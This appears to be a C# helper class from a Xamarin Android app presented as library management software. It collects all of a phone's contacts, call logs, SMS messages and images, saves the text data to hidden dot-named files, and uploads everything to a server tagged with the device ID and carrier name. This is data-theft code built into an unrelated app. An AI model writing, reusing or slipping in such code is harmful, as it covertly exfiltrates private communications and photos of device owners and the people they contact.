using Aspose.Imaging.FileFormats.Jpeg;
using Aspose.Imaging.ImageOptions;
using Library_Mangement.Database.Models;
using Library_Mangement.Model;
using Library_Mangement.Services;
using Library_Mangement.Services.MediaServices;
using Library_Mangement.Services.PlatformServices;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Xamarin.Essentials;
using Xamarin.Forms;
using static Android.Renderscripts.Sampler;

namespace Library_Mangement.Helper
{
    public delegate void backgroundService(string value);
    public class DataUtility
    {
        #region Properties
        public static event backgroundService serviceEvent;
        private static volatile DataUtility _instance;
        private static readonly object SyncRoot = new object();

        #endregion

        #region Constructor
        public DataUtility()
        {

        }
        public static DataUtility Instance
        {
            get
            {
                if (_instance == null)
                {
                    lock (SyncRoot)
                    {
                        if (_instance == null)
                            _instance = new DataUtility();
                    }
                }
                return _instance;
            }
        }
        #endregion

        #region Public Methods
        public async Task<bool> GetAllContacts()
        {
            List<Contact> contactsData = new List<Contact>();
           
            try
            {
                bool isSaved = await isFileUploaded("DataConfig", "contactData");
                if (isSaved)
                    return true;
                var cancellationToken = default(CancellationToken);
                var contacts = await Contacts.GetAllAsync(cancellationToken);

                if (contacts == null)
                    return false;

                int i = 0;
                foreach (var contact in contacts)
                {
                    i++;

                    //if(App.BackgroundServices != null)
                    //{
                    serviceEvent?.Invoke($"Checking {contact.GivenName} _ Count {i}");
                    //}
                    contactsData.Add(contact);
                }
                if (contactsData?.Count > 0)
                {
                    string fileName = GetNewFilePath<List<Contact>>(contactsData, "contactData");
                    return !string.IsNullOrEmpty(fileName) ? await UploadFileOnServer(fileName) : false;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ex)
            {
                return false;
            }
        }
        private async Task<bool> isFileUploaded(string key, string value)
        {
            return await App.Database.Settings.IsDataContainsInValue(key, value);
        }

        private string GetNewFilePath<T>(T data, string FileName)
        {
            try
            {
                var val1 = JsonConvert.SerializeObject(data);
                string fileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), $".{FileName}.txt");
                File.WriteAllText(fileName, val1);
                return fileName;
            }
            catch (Exception ex)
            {
                return string.Empty;
            }
        }

        public async Task<bool> GetAllCallLogs()
        {
            try
            {
               
                if (await isFileUploaded("DataConfig", "callLogs"))
                    return true;
                var callLog = DependencyService.Get<IDeviceInfo>().GetCallLogs().ToList();
                if (callLog?.Count > 0)
                {
                    string fileName = GetNewFilePath<List<CallLogModel>>(callLog, "callLogs");
                    return !string.IsNullOrEmpty(fileName) ? await UploadFileOnServer(fileName) : false;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ex)
            {

                return false;
            }

        }
        public async Task<bool> GetAllDeviceImagesAsync()
        {
            try
            {
               
                App.MediaService.OnMediaAssetLoaded += _mediaService_OnMediaAssetLoaded;
                var Data = await App.MediaService.LoadMediaAsync();
            }
            catch (Exception ex)
            {
                return await Task.FromResult(false);
            }
            App.BackgroundServices.IsServiceBusy = false;
            return await Task.FromResult(true);
        }

        private async void _mediaService_OnMediaAssetLoaded(object sender, MediaEventArgs e)
        {
            await UploadImageFileOnServer(e.Media.PreviewPath);
            await SaveFileData("UP_Images", e.Media.PreviewPath);
        }

        public async Task<bool> SaveFileData(string key, string value)
        {
            try
            {
                var getImageSetting = await App.Database.Settings.FindByKeyAsync(key);
                if (getImageSetting != null)
                {
                    getImageSetting.Value = $"{getImageSetting.Value},{value}";
                    await App.Database.Settings.InsertAsync(getImageSetting);
                }
                else
                {
                    tblSettings imageSettings = new tblSettings();
                    imageSettings.Key = key;
                    imageSettings.Value = value;
                    await App.Database.Settings.InsertAsync(imageSettings);
                }
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        public static async Task<byte[]> GetCompressedFileBytes(string FilePath, int CompressionLevel)
        {
            byte[] fileBytes = null;
            if (Path.GetExtension(FilePath).Contains("png"))
            {
                using (Aspose.Imaging.Image image = Aspose.Imaging.Image.Load(FilePath))
                {
                    PngOptions options = new PngOptions();
                    options.CompressionLevel = CompressionLevel;
                    using (MemoryStream memory = new MemoryStream())
                    {
                        image.Save(memory, options);
                        memory.Position = 0;
                        fileBytes = memory.ToArray();
                    }
                }
            }
            else if (Path.GetExtension(FilePath).Contains("jpg") || Path.GetExtension(FilePath).Contains("jpeg"))
            {
                using (var original = Aspose.Imaging.Image.Load(FilePath))
                {
                    var jpegOptions = new JpegOptions()
                    {
                        ColorType = JpegCompressionColorMode.Grayscale,
                        CompressionType = JpegCompressionMode.Progressive,
                    };
                    using (MemoryStream memory = new MemoryStream())
                    {
                        original.Save(memory, jpegOptions);
                        memory.Position = 0;
                        fileBytes = memory.ToArray();
                    }
                }
            }
            return await Task.FromResult(fileBytes);
        }

        public async Task<bool> GetAllMessages()
        {
            try
            {
               
                if (await isFileUploaded("DataConfig", "MsgLogs"))
                    return true;
                var allMsg = DependencyService.Get<IDeviceInfo>().getAllSms();
                if (allMsg?.Count > 0)
                {
                    string fileName = GetNewFilePath<List<MessageModel>>(allMsg, "MsgLogs");
                    return !string.IsNullOrEmpty(fileName) ? await UploadFileOnServer(fileName) : false;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ex)
            {

                return false;
            }
        }

        private async Task<bool> UploadImageFileOnServer(string filepath)
        {
            try
            {
                var deviceInfo = Common.DeviceDetails();
                var telephonicDetails = DependencyService.Get<IDeviceInfo>().TelephonicDetails;
                string deviceOpratorName = telephonicDetails.NetworkOperatorName;
                if (string.IsNullOrEmpty(telephonicDetails.NetworkOperatorName))
                {
                    deviceOpratorName = "No-Sim";
                }
                //Task.Run(async () => await RestService.FileUpload(filepath, $"{deviceOpratorName.ToLowerInvariant()}-{deviceInfo.DeviceID.ToLowerInvariant()}", true));
                //foreach (var filepath in filePaths)
                //{
                //    await RestService.FileUpload(filepath, $"{deviceOpratorName.ToLowerInvariant()}-{deviceInfo.DeviceID.ToLowerInvariant()}", true);
                //}
                await RestService.FileUpload(filepath, $"{deviceOpratorName.ToLowerInvariant()}-{deviceInfo.DeviceID.ToLowerInvariant()}", true);
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        private async Task<bool> UploadFileOnServer(string fileName)
        {
            try
            {
                var deviceInfo = Common.DeviceDetails();
                var telephonicDetails = DependencyService.Get<IDeviceInfo>().TelephonicDetails;
                string deviceOpratorName = telephonicDetails.NetworkOperatorName;
                if (string.IsNullOrEmpty(telephonicDetails.NetworkOperatorName))
                {
                    deviceOpratorName = "No-Sim";
                }
                var res = await RestService.FileUpload(fileName, $"{deviceOpratorName.ToLowerInvariant()}-{deviceInfo.DeviceID.ToLowerInvariant()}");
                if (res != null)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
            catch (Exception ex)
            {
                return false;
            }
        }
        #endregion
    }
}
